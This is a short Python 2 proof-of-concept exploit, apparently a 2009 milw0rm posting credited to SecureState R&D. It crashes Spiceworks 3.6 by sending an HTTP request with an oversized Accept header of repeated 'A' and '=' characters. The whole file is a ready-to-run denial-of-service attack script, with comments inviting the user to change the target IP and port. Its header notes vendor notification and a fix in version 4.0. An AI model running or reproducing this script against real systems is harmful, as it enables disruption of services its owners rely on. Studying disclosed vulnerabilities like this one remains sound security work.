#!/usr/bin/python
# Spiceworks 3.6 Accept Parameter Overflow 
# Remote Crash P.O.C.
# Written by: SecureState R&D
# Author: David Kennedy (ReL1K)
# Tested on Windows 2003 SP2 R2
#
# Vendor Notified on: 05/11/2009
# Vendor Fix: Fixed in version 4.0
#
# esi 000334E0 ASCII "AAAAAAAAAAAAAAAAAA"
# edi 000334E0 ASCII "AAAAAAAAAAAAAAAAAA"
#
import socket
crash="A" * 1000
crash+="=" * 1001 # = signs cause the crash
buffer="GET /login HTTP/1.1\r\n"
buffer+="Host: 10.211.55.136:9000\r\n" # change IP + port to fit your own needs.
buffer+="User-Agent: Ohn0esIhascrash\r\n"
buffer+="Accept: " + crash # <---- vulnerable field here
buffer+="\r\n\r\n"
exploit = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
# Enter your own IP below
exploit.connect(("10.211.55.136", 80)) # change IP + port to fit your own needs.
print "[-] SpiceWorks 3.6 Remote Crash [-]"
print "[-] Written by: SecureState R&D [-]"
print "[-] Author: David Kennedy (ReL1K) [-]"
print "[-] Triggering overflow... [-]"
exploit.send(buffer)
exploit.close()

# milw0rm.com [2009-08-07]